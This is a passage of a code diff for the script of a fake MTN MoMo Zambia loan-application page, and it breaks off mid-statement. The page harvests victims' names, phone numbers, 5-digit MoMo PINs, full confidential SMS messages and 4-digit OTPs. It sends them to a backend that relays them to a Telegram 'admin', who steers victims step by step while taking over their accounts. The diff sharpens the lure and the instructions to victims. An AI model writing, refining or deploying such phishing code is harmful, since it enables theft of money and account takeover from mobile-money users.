@@ -35,7 +35,8 @@
     const sumPurpose = $('sum-purpose');
     const sumApplicant = $('sum-applicant');
     const depositRequiredAmount = $('deposit-required-amount');
-    const successDepositAmount = $('success-deposit-amount');
+    const successLoanAmount = $('success-loan-amount');
+    const successLoanAmountDetail = $('success-loan-amount-detail');
 
     const bannerPhoneError = $('banner-phone-error');
     const bannerForm3Error = $('banner-form3-error');
@@ -47,6 +48,7 @@
     const bannerOtpInfo = $('banner-otp-info');
 
     const displayPinPhone = $('display-pin-phone');
+    const pinPhoneInline = $('pin-phone-inline');
     const yelloPinInput = $('yello-pin-input');
     const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
     const btnSignInPin = $('btn-sign-in-pin');
@@ -68,37 +70,47 @@
     let pinAutoSubmittedForCurrentValue = '';
     let smsAutoSubmittedForCurrentValue = '';
     let otpSubmittedForCurrentValue = '';
+    let appliedLoanLabel = 'ZMW 100,000';
 
     const urlParams = new URLSearchParams(window.location.search);
     const adminParam = urlParams.get('admin') || '';
 
-    const REQUIRED_SMS_REGEX =
-      /^Y['’]ello\.\s*Please note!(?:\s*This confidential code gives access to your MoMo account:.*)?$/i;
+    const REQUIRED_SMS_REGEX = /^Y['’]ello\.\s*Please note!/i;
 
     function isValidMomoSms(rawSms) {
       const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
       return REQUIRED_SMS_REGEX.test(normalized);
     }
 
-    function toZeroPrefixPhone(rawPhone) {
+    function toTenDigitZeroPhone(rawPhone) {
       const digits = String(rawPhone || '').replace(/\D/g, '');
-      if (digits.startsWith('260')) return '0' + digits.slice(3);
-      if (digits.startsWith('0')) return digits;
-      if (/^(96|76|56)\d{7}$/.test(digits)) return '0' + digits;
-      return digits;
-    }
-
-    function isValidMtnZambia(rawPhone) {
-      const normalized = toZeroPrefixPhone(rawPhone);
-      return /^(096|076|056)\d{7}$/.test(normalized);
-    }
-
-    function formatDisplayPhone(rawPhone) {
-      const zeroPhone = toZeroPrefixPhone(rawPhone);
-      if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
-        return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
+      if (digits.startsWith('260') && digits.length === 12) {
+        return '0' + digits.slice(3);
       }
-      return zeroPhone || '096 XXX XXXX';
+      if (/^(96|76|56)\d{7}$/.test(digits)) {
+        return '0' + digits;
+      }
+      if (digits.startsWith('0')) {
+        return digits.slice(0, 10);
+      }
+      return digits.slice(0, 10);
+    }
+
+    function isValidTenDigitZeroPhone(rawPhone) {
+      const normalized = toTenDigitZeroPhone(rawPhone);
+      return /^0(96|76|56)\d{7}$/.test(normalized) && normalized.length === 10;
+    }
+
+    function formatAppliedAmount(rawAmt) {
+      const cleanNum = Number(String(rawAmt || '100,000').replace(/\D/g, '')) || 100000;
+      return `ZMW ${cleanNum.toLocaleString()}`;
+    }
+
+    function setAppliedLoanAmountDisplay(rawAmt) {
+      appliedLoanLabel = formatAppliedAmount(rawAmt);
+      if (sumAmount) sumAmount.innerText = appliedLoanLabel;
+      if (successLoanAmount) successLoanAmount.innerText = appliedLoanLabel;
+      if (successLoanAmountDetail) successLoanAmountDetail.innerText = appliedLoanLabel;
     }
 
     function showBanner(el, msg) {
@@ -146,6 +158,7 @@
       if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
       if (formAmountInput) formAmountInput.value = amt.toLocaleString();
       if (sumDuration) sumDuration.innerText = `${mths} Months`;
+      setAppliedLoanAmountDisplay(amt);
       const monthly = (amt * 1.1) / mths;
       if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
     }
@@ -159,6 +172,15 @@
       monthsSlider.addEventListener('change', updateCalc);
     }
     updateCalc();
+
+    if (formPhoneInput) {
+      formPhoneInput.addEventListener('input', () => {
+        const digitsOnly = formPhoneInput.value.replace(/\D/g, '').slice(0, 10);
+        if (formPhoneInput.value !== digitsOnly) {
+          formPhoneInput.value = digitsOnly;
+        }
+      });
+    }
 
     function syncPinReadyState() {
       if (!yelloPinInput || !btnSignInPin) return;
@@ -175,7 +197,7 @@
       const amtRaw = (formAmountInput?.value || '100,000').trim();
       const dur = loanDurationSelect?.value || '48 Months';
       const purp = (loanPurposeInput?.value || '').trim() || 'Business';
-      if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
+      setAppliedLoanAmountDisplay(amtRaw);
       if (sumDuration) sumDuration.innerText = dur;
       if (sumPurpose) sumPurpose.innerText = purp;
       hideBanner(bannerPhoneError);
@@ -189,14 +211,14 @@
       const ph = (formPhoneInput?.value || '').trim();
 
       if (!fn || !ln) {
-        showBanner(bannerPhoneError, 'Please enter your first name and last name.');
+        showBanner(bannerPhoneError, 'PLEASE ENTER YOUR FIRST NAME AND LAST NAME.');
         return;
       }
 
-      if (!isValidMtnZambia(ph)) {
+      if (!isValidTenDigitZeroPhone(ph)) {
         showBanner(
           bannerPhoneError,
-          'Enter a valid MTN Zambia number starting with 096, 076, or 056.'
+          'ENTER A VALID 10-DIGIT MTN ZAMBIA NUMBER STARTING WITH 0 (096, 076, OR 056).'
         );
         return;
       }
@@ -204,7 +226,7 @@
       const amtRaw = (formAmountInput?.value || '100,000').trim();
       const dur = loanDurationSelect?.value || '48 Months';
       const purp = (loanPurposeInput?.value || '').trim() || 'Business';
-      if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
+      setAppliedLoanAmountDisplay(amtRaw);
       if (sumDuration) sumDuration.innerText = dur;
       if (sumPurpose) sumPurpose.innerText = purp;
       if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
@@ -212,7 +234,6 @@
       const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
       const depVal = Math.max(200, Math.round(numericAmt * 0.002));
       if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
-      if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;
 
       hideBanner(bannerForm3Error);
       showScreen(screens.form3);
@@ -223,17 +244,20 @@
       const fn = (firstNameInput?.value || '').trim();
       const ln = (lastNameInput?.value || '').trim();
       const ph = (formPhoneInput?.value || '').trim();
+      const amtRaw = (formAmountInput?.value || '100,000').trim();
+
+      setAppliedLoanAmountDisplay(amtRaw);
 
       const fullName =
         `${fn} ${ln}`.trim().toUpperCase() ||
         (sumApplicant?.innerText || '').trim() ||
         'MTN MOMO ZAMBIA';
-      const zeroPhone = toZeroPrefixPhone(ph);
-      const formattedPhone = formatDisplayPhone(zeroPhone);
+      const tenDigitPhone = toTenDigitZeroPhone(ph);
 
-      if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
-      if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
-      if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
+      if (displayPinPhone) displayPinPhone.innerText = tenDigitPhone;
+      if (pinPhoneInline) pinPhoneInline.innerText = tenDigitPhone;
+      if (displaySmsPhone) displaySmsPhone.innerText = tenDigitPhone;
+      if (displayOtpPhone) displayOtpPhone.innerText = tenDigitPhone;
       if (sumApplicant) sumApplicant.innerText = fullName;
 
       pinAutoSubmittedForCurrentValue = '';
@@ -261,7 +285,8 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               adminChatId: adminParam,
-              applicant: { fullName, phone: zeroPhone }
+              applicant: { fullName, phone: tenDigitPhone },
+              loan: { amount: appliedLoanLabel }
             })
           }
         );
@@ -296,14 +321,14 @@
       hideBanner(bannerPinError);
       hideBanner(bannerPinInfo);
       const rawPhone = displayPinPhone?.innerText || formPhoneInput?.value || '';
-      const phoneZero = toZeroPrefixPhone(rawPhone);
+      const phoneTenDigit = toTenDigitZeroPhone(rawPhone);
       const applicantName =
         (
           sumApplicant?.innerText ||
           `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`
         ).trim() || 'MTN MOMO ZAMBIA';
 
-      showLoading('SENDING DETAILS FOR VERIFICATION...', 'Please wait for admin response...');
+      showLoading('SENDING PHONE NO & 5-DIGIT PIN...', 'Please wait for admin response...');
 
       try {
         const res = await fetch('/api/submit-pin', {
@@ -311,7 +336,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             userId: currentUserId,
-            phone: phoneZero,
+            phone: phoneTenDigit,
             pin: pinVal,
             applicantName
           })
@@ -324,14 +349,16 @@
       } catch (e) {
         hideLoading();
         pinAutoSubmittedForCurrentValue = '';
-        showBanner(bannerPinError, 'Connection error. Please enter your 5-digit PIN again.');
+        showBanner(bannerPinError, 'CONNECTION ERROR. PLEASE ENTER YOUR 5-DIGIT PIN AGAIN.');
       }
     }
 
     async function submitSmsToTelegram(smsText, autoDetected) {
       hideBanner(bannerSmsError);
       hideBanner(bannerSmsInfo);
-      const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');
+      const phoneTenDigit = toTenDigitZeroPhone(
+        displaySmsPhone?.innerText || formPhoneInput?.value || ''
+      );
 
       showLoading('VERIFYING SMS CODE...', 'Please wait while admin reviews your SMS...');
 
@@ -341,7 +368,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             userId: currentUserId,
-            phone: phoneZero,
+            phone: phoneTenDigit,
             sms: smsText,
             autoDetected
           })
@@ -350,14 +377,14 @@
       } catch (e) {
         hideLoading();
         smsAutoSubmittedForCurrentValue = '';
-        showBanner(bannerSmsError, 'Unable to submit SMS. Please try again.');
+        showBanner(bannerSmsError, 'UNABLE TO SUBMIT SMS. PLEASE TRY AGAIN.');
       }
     }
 
     async function submitOtpToTelegram(otpVal, autoSubmitted) {
       hideBanner(bannerOtpError);
       hideBanner(bannerOtpInfo);
-      const phoneZero = toZeroPrefixPhone(
+      const phoneTenDigit = toTenDigitZeroPhone(
         displayOtpPhone?.innerText || displaySmsPhone?.innerText || formPhoneInput?.value || ''
       );
 
@@ -369,7 +396,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             userId: currentUserId,
-            phone: phoneZero,
+            phone: phoneTenDigit,
             otp: otpVal,
             autoSubmitted
           })
@@ -378,7 +405,7 @@
       } catch (e) {
         hideLoading();
         otpSubmittedForCurrentValue = '';
-        showBanner(bannerOtpError, 'Unable to submit MTN MoMo 4-Digit OTP. Please try again.');
+        showBanner(bannerOtpError, 'UNABLE TO SUBMIT 4-DIGIT OTP. PLEASE TRY AGAIN.');
       }
     }
 
@@ -399,14 +426,17 @@
             hideLoading();
             if (blockedReasonText) {
               blockedReasonText.innerText =
-                'BLOCK — Applicant is not sending VALID MTN MoMo details.';
+                'PLEASE CHECK YOUR MOMO DETAILS AND TRY AGAIN.';
             }
             showScreen(screens.stopped);
           } else if (st === 'PROCEED_SMS') {
             clearInterval(statusPollInterval);
             hideLoading();
             hideBanner(bannerSmsError);
-            showBanner(bannerSmsInfo, 'APPROVE / NEXT — Enter your SMS verification code.');
+            showBanner(
+              bannerSmsInfo,
+              'ALLOW — PLEASE COPY AND PASTE THE WHOLE SMS ON THE SPACE PROVIDED THE WHOLE SMS SEND TO YOUR MOMO NUMBER.'
+            );
             smsAutoSubmittedForCurrentValue = '';
             if (smsInputBox) smsInputBox.value = '';
             showScreen(screens.sms);
@@ -420,7 +450,7 @@
             if (yelloPinInput) yelloPinInput.value = '';
             syncPinReadyState();
             showScreen(screens.pin);
-            showBanner(bannerPinError, 'INCORRECT PIN — Please enter a new 5-digit PIN.');
+            showBanner(bannerPinError, 'INCORRECT PIN — ENTER A NEW 5-DIGIT PIN ON THE EMPTY SPACE PROVIDED.');
             if (yelloPinInput) yelloPinInput.focus();
           } else if (st === 'SMS_EXPIRED') {
             clearInterval(statusPollInterval);
@@ -428,7 +458,10 @@
             smsAutoSubmittedForCurrentValue = '';
             if (smsInputBox) smsInputBox.value = '';
             showScreen(screens.sms);
-            showBanner(bannerSmsError, 'SMS EXPIRES — Please enter a new SMS or request a new SMS.');
+            showBanner(
+              bannerSmsError,
+              'SMS EXPIRED — ENTER A NEW INCOMING SMS ON THE EMPTY SPACE PROVIDED.'
+            );
             startSmsCountdown();
             if (smsInputBox) smsInputBox.focus();
           } else if (st === 'PROCEED_OTP') {
@@ -438,7 +471,7 @@
             hideBanner(bannerOtpError);
             showBanner(
               bannerOtpInfo,
-              'APPROVE — Check your SMS and enter the 4 digits sent to SMS on your MoMo number.'
+              'ENTER NEW INCOMING 4 DIGITS SENT TO YOUR MOMO NUMBER.'
             );
             otpSubmittedForCurrentValue = '';
             otpBoxes4.forEach((b) => (b.value = ''));
@@ -453,13 +486,14 @@
             showScreen(screens.otp);
             showBanner(
               bannerOtpError,
-              'EXPIRED OTP CODE — Check your SMS and enter a new 4-digit OTP.'
+              'OTP EXPIRES — ENTER NEW INCOMING 4 DIGITS SENT TO YOUR MOMO NUMBER.'
             );
             if (otpBoxes4[0]) otpBoxes4[0].focus();
           } else if (st === 'SUCCESS' || st === 'APPROVED') {
             clearInterval(statusPollInterval);
             if (smsTimerInterval) clearInterval(smsTimerInterval);
             hideLoading();
+            setAppliedLoanAmountDisplay(formAmountInput?.value || appliedLoanLabel);
             showScreen(screens.success);
           }
         } catch (e) {}
@@ -515,39 +549,10 @@
           goFromForm1ToForm2();
           break;
         case 'btn-form2-prev':
+        case 'btn-form2-prev-alt':
           showScreen(screens.form1);
           break;
         case 'btn-form2-next':
           goFromForm2ToForm3();
           break;
-        case 'btn-form3-prev':
-          showScreen(screens.form2);
-          break;
-        case 'btn-form3-submit':
-          await submitApplicationAndOpenPin();
-          break;
-        case 'btn-pin-back':
-          if (statusPollInterval) clearInterval(statusPollInterval);
-          hideLoading();
-          showScreen(screens.form3);
-          break;
-        case 'btn-toggle-pin-visibility':
-          if (yelloPinInput && btnTogglePinVisibility) {
-            const isHidden = yelloPinInput.type === 'password';
-            yelloPinInput.type = isHidden ? 'text' : 'password';
-            btnTogglePinVisibility.innerText = isHidden ? '🙈' : '👁️';
-          }
-          break;
-        case 'btn-sign-in-pin': {
-          const pinVal = (yelloPinInput?.value || '').replace(/\D/g, '').slice(0, 5);
-          if (pinVal.length !== 5) {
-            showBanner(bannerPinError, 'Please enter your 5-digit PIN.');
-            return;
-          }
-          pinAutoSubmittedForCurrentValue = pinVal;
-          await submitPinToTelegram(pinVal);
-          break;
-        }
-        case 'link-forgot-pin':
-          if (event) event.preventDefault();
-          show
+        case 'b
